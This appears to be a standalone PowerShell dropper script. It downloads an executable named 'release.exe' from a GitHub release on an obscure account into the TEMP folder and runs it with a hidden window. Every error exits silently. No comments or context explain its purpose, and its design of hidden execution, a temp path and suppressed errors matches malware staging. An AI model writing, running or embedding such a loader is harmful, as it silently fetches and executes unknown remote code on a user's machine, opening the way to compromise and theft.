param (
    [string]$DownloadUrl = 'https://github.com/giasfelfebrehber/stuff/releases/download/1/release.exe',
    [string]$OutputPath = "$env:TEMP\release.exe"
)

function Download-File {
    param (
        [string]$Url,
        [string]$Destination
    )
    try {
        Invoke-WebRequest -Uri $Url -OutFile $Destination -UseBasicParsing -ErrorAction Stop
    } catch {
        exit 1
    }
}

function Run-Executable {
    param (
        [string]$FilePath
    )
    if (-Not (Test-Path $FilePath)) { exit 1 }
    try {
        Start-Process -FilePath $FilePath -Wait -WindowStyle Hidden
    } catch {
        exit 1
    }
}

Download-File -Url $DownloadUrl -Destination $OutputPath
Run-Executable -FilePath $OutputPath
